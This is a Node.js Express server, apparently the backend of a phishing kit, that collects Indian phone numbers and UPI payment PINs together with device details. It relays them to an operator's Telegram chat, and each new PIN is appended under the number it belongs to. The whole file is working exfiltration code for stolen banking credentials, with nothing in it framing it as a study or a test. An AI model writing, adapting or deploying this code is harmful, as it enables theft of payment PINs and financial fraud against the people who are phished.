require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

// State to handle message editing
let lastMessageId = null;
let currentMessageText = "";

const sendOrUpdateTelegram = async (message) => {
    try {
        if (!lastMessageId) {
            // Send new message for the first hit (Number)
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            lastMessageId = response.data.result.message_id;
            currentMessageText = message;
        } else {
            // Edit the existing message for UPI PINs
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: lastMessageId,
                text: message,
                parse_mode: 'Markdown'
            });
            currentMessageText = message;
        }
    } catch (error) {
        // Fallback: if edit fails, send a fresh one
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        lastMessageId = response.data.result.message_id;
        currentMessageText = message;
    }
};

const startupNotification = async () => {
    // Basic notification without setting lastMessageId
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `*BJP Client's*`,
            parse_mode: 'Markdown'
        });
    } catch (e) {}
};

app.post('/send-data', async (req, res) => {
    const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
    
    let updatedText = "";

    if (type === 'NUMBER') {
        // Fresh block for new user/number
        lastMessageId = null; 
        updatedText = `Device Model: ${deviceId || 'Detecting...'}\n`;
        updatedText += `Date: ${deviceDate || 'Detecting...'}\n`; 
        updatedText += `Real Time: ${deviceTime || 'Detecting...'}\n`; 
        updatedText += `Number: +91 ${number}\n`;
    } else if (type === 'PIN' || pin) {
        // Append new PIN under the existing number message
        updatedText = currentMessageText + `UPI PIN: ${pin}\n`;
    }

    if (updatedText) {
        await sendOrUpdateTelegram(updatedText);
    }
    
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
